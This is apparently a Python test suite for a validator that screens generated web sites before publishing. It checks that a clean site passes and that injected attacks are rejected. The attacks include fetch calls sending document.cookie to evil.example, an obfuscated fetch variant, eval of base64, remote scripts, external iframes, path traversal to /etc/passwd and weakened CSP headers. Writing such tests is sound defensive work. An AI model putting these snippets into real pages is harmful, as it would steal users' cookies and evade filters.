"""test_site_validator.py — M5 security gate (handoff §7.5 / §11).

Per the verification-debt note, the validator is tested against GENUINELY MALICIOUS
sites: each negative control injects one real attack (network egress, dynamic code
exec, remote script, external iframe, path traversal, ...) and MUST be rejected. A
clean site MUST pass. A validator only tested on clean input is theater. Exit
nonzero on any failure.

Run: py -3.12 apps/band/chapterstage_backend/tests/test_site_validator.py
"""
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

_BACKEND = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_BACKEND))

from app.services.site_validator import METADATA_KEYS, validate_site  # noqa: E402

FAILURES: list[str] = []
RAN: list[str] = []


def check(name, cond, receipt=""):
    RAN.append(name)
    print("  [%s] %s" % ("PASS" if cond else "FAIL", name))
    if receipt and not cond:
        print("         receipt: %s" % receipt)
    if not cond:
        FAILURES.append(name)


# the strict allowlist CSP the boundary requires (matches REQUIRED_CSP)
_CSP = ("default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; connect-src 'self'; frame-src 'none'; "
        "object-src 'none'; base-uri 'none'; form-action 'none'")
_CLEAN_HTML = (
    "<!doctype html><html><head><meta charset='utf-8'>"
    "<meta http-equiv='Content-Security-Policy' content=\"%s\">"
    "<meta name='viewport' content='width=device-width, initial-scale=1'>"
    "<link rel='stylesheet' href='styles.css'><title>T</title></head>"
    "<body><button aria-label='next'>Next</button>"
    "<script src='script.js'></script></body></html>") % _CSP
_CLEAN_JS = (
    "fetch('/api/v1/experiences/exp/progress', {credentials: 'same-origin'});"
    "document.querySelector('button').addEventListener('click', ()=>{});")
_CLEAN_CSS = "body{font-family:sans-serif}"


def _meta(**over):
    m = {k: ("v" if k not in ("screen_count", "faithfulness_score",
                              "engagement_score") else 1) for k in METADATA_KEYS}
    m.update(over)
    return json.dumps(m)


def write_site(files: dict) -> Path:
    d = Path(tempfile.mkdtemp())
    for name, content in files.items():
        p = d / name
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(content, encoding="utf-8")
    return d


def clean_files(**over):
    f = {"index.html": _CLEAN_HTML, "styles.css": _CLEAN_CSS,
         "script.js": _CLEAN_JS, "metadata.json": _meta(),
         "manifest.json": json.dumps({
             "experience_id": "exp", "job_id": "job", "title": "T",
             "screen_order": ["screen-1"], "initial_screen_id": "screen-1",
             "components_used": ["text_screen"], "checkpoint_rules": {}}),
         "screens/screen-1.json": json.dumps({
             "id": "screen-1", "title": "Screen 1",
             "component_type": "text_screen", "content": {"text": "Hello"}})}
    f.update(over)
    return f


def main():
    print("test_site_validator.py — M5 security gate (§7.5 / §11)")

    # -- POSCONTROL: a clean site passes.
    rep = validate_site(write_site(clean_files()))
    check("POSCONTROL clean site PASSES", rep["passed"],
          receipt="violations=%r" % rep["violations"])

    # -- NEGATIVE CONTROLS: genuinely malicious sites MUST be rejected.
    def rejects(name, files, want_check):
        rep = validate_site(write_site(files))
        hit = any(v["check"] == want_check for v in rep["violations"])
        check("NEGCONTROL %s -> REJECTED (%s)" % (name, want_check),
              (not rep["passed"]) and hit,
              receipt="passed=%r violations=%r" % (rep["passed"], rep["violations"]))

    rejects("remote URL literal", clean_files(
        **{"script.js": "fetch('https://evil.example/exfil?d='+document.cookie)"}),
        "forbidden_remote_url")
    rejects("eval()", clean_files(**{"script.js": "eval(atob('YWxlcnQoMSk='))"}),
            "forbidden_eval")
    rejects("Function constructor", clean_files(
        **{"script.js": "const f = new Function('return 1'); f();"}),
        "forbidden_function_ctor")
    rejects("XMLHttpRequest", clean_files(
        **{"script.js": "var x = new XMLHttpRequest(); x.open('GET','/');"}),
        "forbidden_xhr")
    rejects("WebSocket", clean_files(
        **{"script.js": "var s = new WebSocket('wss://evil.example');"}),
        "forbidden_websocket")
    rejects("remote <script src=http>", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "<script src='script.js'>",
            "<script src='https://cdn.evil.example/x.js'></script><script src='script.js'>")}),
        "forbidden_remote_script")
    rejects("external iframe", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "<body>", "<body><iframe src='https://evil.example'></iframe>")}),
        "forbidden_external_iframe")
    rejects("inline onclick handler", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "<button aria-label='next'>", "<button onclick='steal()'>")}),
        "forbidden_inline_handler")
    rejects("path traversal asset", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "href='styles.css'", "href='../../../../etc/passwd'")}),
        "path_traversal")
    rejects("broken local asset", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "<body>", "<body><img src='missing.png'>")}),
        "broken_asset")
    rejects("no viewport", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "<meta name='viewport' content='width=device-width, initial-scale=1'>", "")}),
        "no_viewport")
    rejects("missing required file", {"index.html": _CLEAN_HTML,
                                      "styles.css": _CLEAN_CSS,
                                      "metadata.json": _meta(),
                                      "manifest.json": "{}"},  # no script.js
            "missing_file")
    rejects("metadata missing key", clean_files(
        **{"metadata.json": json.dumps({"job_id": "x"})}),
        "metadata_schema")
    rejects("oversized script.js", clean_files(
        **{"script.js": "a".encode() * 260_000}),
        "size_limit")

    # -- CSP ALLOWLIST BOUNDARY (the denylist-evasion fix, watcher 2026-06-14).
    _csp_meta = "<meta http-equiv='Content-Security-Policy' content=\"%s\">" % _CSP
    rejects("no CSP meta", clean_files(
        **{"index.html": _CLEAN_HTML.replace(_csp_meta, "")}), "csp")
    rejects("weak CSP (unsafe-eval)", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "script-src 'self'", "script-src 'self' 'unsafe-eval'")}), "csp")
    rejects("weak CSP (connect-src *)", clean_files(
        **{"index.html": _CLEAN_HTML.replace("connect-src 'self'", "connect-src *")}),
        "csp")
    # CSP DESYNC (club 2026-06-14): a duplicate directive that a last-wins parser
    # reads as safe but the browser (first-wins) reads as permissive. parse_csp must
    # match the browser, so the permissive FIRST copy is what's judged -> rejected.
    rejects("CSP desync (duplicate directive, browser first-wins)", clean_files(
        **{"index.html": _CLEAN_HTML.replace(
            "connect-src 'self'", "connect-src *; connect-src 'self'")}),
        "csp")

    # -- EVASION: obfuscated fetch BEATS the old fetch regex, but the remote URL is
    # still visible and rejected by the local-only contract. The runtime CSP header
    # also blocks remote egress at the browser boundary (test_public_csp.py).
    evasive = "window['fet'+'ch']('https://evil.example/x?c='+document.cookie)"
    rep = validate_site(write_site(clean_files(**{"script.js": evasive})))
    check("EVASION obfuscated fetch remote URL is rejected",
          any(v["check"] == "forbidden_remote_url" for v in rep["violations"]),
          receipt="violations=%r" % rep["violations"])
    rejects("EVASION obfuscated fetch + NO csp -> rejected by the boundary",
            {"index.html": _CLEAN_HTML.replace(_csp_meta, ""),
             "styles.css": _CLEAN_CSS, "script.js": evasive,
             "metadata.json": _meta(),
             "manifest.json": clean_files()["manifest.json"],
             "screens/screen-1.json": clean_files()["screens/screen-1.json"]}, "csp")

    rejects("missing manifest", {k: v for k, v in clean_files().items()
                                if k != "manifest.json"}, "missing_file")
    rejects("invalid screen schema", clean_files(
        **{"screens/screen-1.json": json.dumps({"id": "screen-1"})}),
        "screen_schema")

    # -- DISCRIMINATOR: the clean site still passes (gate isn't reject-everything).
    rep = validate_site(write_site(clean_files()))
    check("DISCRIMINATOR clean still passes (validator not a blanket-reject)",
          rep["passed"], receipt="violations=%r" % rep["violations"])

    print("%d/%d gate checks passed" % (len(RAN) - len(FAILURES), len(RAN)))
    if FAILURES:
        print("GATE FAIL: %s" % ", ".join(FAILURES))
        sys.exit(1)
    print("GATE PASS — site_validator blocks network egress, dynamic code exec, "
          "remote scripts, external iframes, traversal, and bad contracts; clean "
          "sites pass. Untrusted-until-validated holds (§11).")
    sys.exit(0)


if __name__ == "__main__":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except AttributeError:
        pass
    main()
